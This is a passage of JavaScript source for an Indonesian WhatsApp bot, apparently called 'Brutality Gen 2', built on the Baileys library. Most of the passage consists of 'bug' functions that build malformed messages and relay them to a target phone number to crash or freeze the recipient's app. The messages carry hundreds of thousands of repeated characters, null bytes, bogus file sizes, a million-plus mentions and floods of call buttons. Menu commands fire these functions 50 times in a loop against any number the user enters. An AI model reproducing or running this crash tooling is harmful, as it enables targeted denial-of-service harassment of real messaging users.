							"disappearingMode": {},
							"actionLink": {
								"url": " p "
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc,
					}
				} : {}
			);
		};
		
// Blank Speciality //
async function BlankInvite(LockJids, ptcp = false) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await dikabot.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
		
		    async function StuckNull(X, ThM, Ptcp = true) {
      await dikabot.relayMessage(
        X,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⭑̤▾ ⿻ B̷̫͊R̵͚̕Ū̷͉T̴̻͋A̷̼͂L̶͌͜I̶̲̒T̴͕̽Y̷̘͋ ⿻ ▾⭑̤",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: zkosong,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text:
                    "...💣 B̷̫͊R̵͚̕Ū̷͉T̴̻͋A̷̼͂L̶͌͜I̶̲̒T̴͕̽Y̷̘͋ ☠️̤\n" +
                    "\n\n\n\n\n\n\n\n\n\n\n\n@6283846077142".repeat(27000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["6283846077142@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆 𝗙𝗶𝗹𝗲 ☠️",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
    }

    async function ClPmNull(X, Qtd, ThM, cct = false, ptcp = true) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "B̷̫͊R̵͚̕Ū̷͉T̴̻͋A̷̼͂L̶͌͜I̶̲̒T̴͕̽Y̷̘͋",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: zkosong,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "🐉 B̷̫͊R̵͚̕Ū̷͉T̴̻͋A̷̼͂L̶͌͜I̶̲̒T̴͕̽Y̷̘͋🔥" + "ꦾ" + "ꦾ".repeat(77777),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await dikabot.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
    }
    
		const thegenkz = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./all/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

		const dikagenkz = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./all/image/zkosong.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
							"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"DIKΛƬΉΣGΣПKZ\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
						}]
					}
				}
			}
		}

async function newcall(target) {
    let virtex = "𝘿𝙞𝙠𝙖𝙎𝙥𝙚𝙨𝙞𝙖𝙡";
    await dikabot.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'cta_url',
                                buttonParamsJson: "{ display_text : '𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘋𝘪𝘬𝘢 𝘐𝘋', url : '', merchant_url : '' }"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall2(target) {
    let virtex = "𝘿𝙞𝙠𝙖𝙎𝙥𝙚𝙨𝙞𝙖𝙡" + "𑜦".repeat(40000);

    await dikabot.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ""
                    },
                    nativeFlowMessage: {
                        buttons: Array(20).fill({
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        })
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall3(target) {
    let virtex = "𝘿𝙞𝙠𝙖𝙎𝙥𝙚𝙨𝙞𝙖𝙡";
    let buttons = Array.from({ length: 200 }, () => ({
        name: 'call_permission_request',
        buttonParamsJson: '{}'
    }));
    let overJids = Array.from({ length: 1039900 }, () => target);
    
    await dikabot.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: virtex,
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: buttons
                    }
                }
            }
        },
        contextInfo: {
            mentionedJid: overJids,
            externalAdReply: {
                showAdAttribution: true,
                renderLargerThumbnail: false,
                title: `💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮`,
                body: `💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮`,
                previewType: "VIDEO",
                thumbnail: "",
                sourceUrl: "https://www.whatsapp.com/",
                mediaUrl: "https://www.whatsapp.com/"
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newcall4(target) {
    let virtex = "𝘿𝙞𝙠𝙖𝙎𝙥𝙚𝙨𝙞𝙖𝙡";
    await dikabot.relayMessage(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: virtex,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: 'call_permission_request',
                                buttonParamsJson: '{}'
                            },
                            {
                                name: 'payment_method',
                                buttonParamsJson: "{}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: `{"title":"💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮  ◄${"᬴".repeat(60000)}","sections":[{"title":"# 💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮","rows":[]}]}`
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\":)\",\"flow_id\":\"💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮\",\"flow_message_version\":\"9\",\"flow_token\":\"💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮\"}`
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "{}"
                            }
                        ],
                        messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\"💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮\",\"body\":\"Zcoder Crash\"}"
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newvirpen(target) {
    let virtex = "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" + "ꦾ".repeat(50000);

    let mentionedJidArray = Array.from({ length: 35000 }, () => 
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
    );

    let message = {
        groupMentionedMessage: {
            message: {
                listResponseMessage: {
                    title: " @120363326274964194@g.us",
                    listType: "SINGLE_SELECT",
                    singleSelectReply: {
                        selectedRowId: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘋𝘪𝘬𝘢 𝘐𝘋"
                    },
                    description: " @120363326274964194@g.us",
                    contextInfo: {
                        mentionedJid: mentionedJidArray,
                        groupMentions: [{ 
                            groupJid: "120363326274964194@g.us", 
                            groupSubject: virtex 
                        }]
                    }
                }
            }
        }
    };

    await dikabot.relayMessage(target, message, { participant: { jid: target } }, { messageId: null });
}

async function freezekamoflase(target) {

    await dikabot.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘋𝘪𝘬𝘢 𝘐𝘋" + "ꦾ".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘈𝘵𝘵𝘢𝘤𝘬 𝘉𝘺 𝘋𝘪𝘬𝘢 𝘐𝘋" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

async function newfreezebug(target) {
    let virtex = "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮";

    await dikabot.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮" + "@zcoder9".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "💥 𝗧𝗵𝗲𝗕𝗿𝘂𝘁𝗮𝗹𝗶𝘁𝘆𝗚𝗲𝗻𝟮 " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

/*
     End Function Bug!
*/

let list = []
for (let i of ownerNumber) {
list.push({
displayName: await dikabot.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await dikabot.getName(i + '@s.whatsapp.net')}\n
FN:${await dikabot.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET: dikaid.tech@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://whatsapp.com/channel/0029VaegLveBKfhz5g2mlg1d
item3.X-ABLabel:Saluran\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function monospace(string) {
return '```' + string + '```'
}
 
// Gak Usah Di Apa Apain Jika Tidak Mau Error
try {
ppuser = await dikabot.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
 
//Status
if (!dikabot.public) {
if (!m.key.fromMe) return
} 

// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
dikabot.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
    dikabot.sendMessage(m.chat, { 
        text: teks 
    }, { quoted: m });
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
dikabot.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
dikabot.groupParticipantsUpdate(m.chat, [sender], 'delete')
dikabot.sendMessage(m.chat, { delete: m.key })
}
}
//===================================
switch (command) {

case 'menu': {
    const dikasound = fs.readFileSync('./all/dikasound.mp3');
    const imageUrl = 'https://i.ibb.co.com/kQbDRpk/7b3ce8fc7a86a3949fd23d5032e73f44.jpg';
    const menuMessage = `「 𝐁𝐑𝐔𝐓𝐀𝐋𝐈𝐓𝐘 𝐆𝐄𝐍 𝟐 」
Hi 👋 *${m.pushName}*\n${ucapanWaktu}\nSaya adalah Bot WhatsApp yang dirancang oleh *Monzy* untuk membantu anda!

〉  \`あ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻\`
➤ 𝐎𝐰𝐧𝐞𝐫 : *${global.ownername}*
➤ 𝐁𝐨𝐭𝐍𝐚𝐦𝐞 : *Brutality*
➤ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 : *2.0*
➤ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*

〉  \`あ 𝗕𝘂𝗴 𝗠𝗲𝗻𝘂\`
➤ ${prefix}thegenk _*628xxx*_
➤ ${prefix}brutality _*628xxx*_
➤ ${prefix}fuckyou _*628xxx*_
➤ ${prefix}crashall _*628xxx*_
➤ ${prefix}jidslock _*628xxx*_
➤ ${prefix}👽 _*628xxx*_
➤ ${prefix}🤫 _*628xxx*_
➤ ${prefix}🔥 _*628xxx*_

〉  \`あ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂\`
➤ ${prefix}hidetag
➤ ${prefix}kick _*628xxx/@tag*_

〉  \`あ 𝗔𝗸𝘀𝗲𝘀 𝗕𝗼𝘁\`
➤ ${prefix}addowner _*628xxx/@tag*_
➤ ${prefix}addprem _*628xxx/@tag*_
➤ ${prefix}delowner _*628xxx/@tag*_
➤ ${prefix}delprem _*628xxx/@tag*_
➤ ${prefix}public/self

\`© 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗕𝘆 𝗗𝗶𝗸𝗮 𝗜𝗗\``;
    dikabot.sendMessage(m.chat, { 
        image: { url: imageUrl },
        caption: menuMessage 
    }, { quoted: m });
    dikabot.sendMessage(m.chat, { 
        audio: dikasound, 
        mimetype: 'audio/mp4', 
        ptt: true 
    }, { quoted: m });
}
break;
//===================================
case 'z': case 'hidetag':
//if (!isRegistered) return registerbut(noregis)
if (!isOwner) return reply(language.onlyown)
if (!text) return reply(language.notext)
dikabot.sendMessage(m.chat, { text : text ? text : '' , mentions: participants.map(a => a.id)}, { quoted: m })
break
//===================================
case "kick": {
if (!isGroup) return reply(language.onlygroup)
if (!isAdmins && !isOwner) return reply(language.onlyadmin)
if (!isBotAdmins) return reply(language.noadmin)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await dikabot.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break
//===================================
case 'thegenk':
if (!isPremium) return reply(language.onlyprem)
if (!q) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘛𝘶𝘯𝘨𝘨𝘶 𝘣𝘢𝘯𝘨 𝘥𝘪𝘬...*`)
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘺𝘦𝘳𝘢𝘯𝘨 _${target}_ 𝘮𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 _${command}_`)
for (let i = 0; i < 50; i++) {
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await VPen(target, wanted)
await uidoc(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
await uidoc2(target, wanted)
await BlankInvite(target, wanted)
}
break;
//===================================
case 'brutality':
if (!isPremium) return reply(language.onlyprem)
if (!q) return reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘊𝘰𝘯𝘵𝘰𝘩 _${prefix+command} 62812371629199_*`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n*𝘛𝘶𝘯𝘨𝘨𝘶 𝘣𝘢𝘯𝘨 𝘥𝘪𝘬...*`)
reply(`\`[ # ] 𝘿𝙄𝙆𝘼 𝙄𝘿\` \n𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘮𝘦𝘯𝘺𝘦𝘳𝘢𝘯𝘨 _${target}_ 𝘮𝘦𝘯𝘨𝘨𝘶𝘯𝘢𝘬𝘢𝘯 _${command}_`)
for (let i = 0; i < 50; i++) {
await StuckNull(target, wanted)
await ClPmNull(target, wanted)
await liveLokFreeze(target, wanted)
await BlankInvite(target, wanted)
await documentfreeze(target, wanted)
await locasifreeze(target, wanted)
await liveLokFreeze(target, wanted)
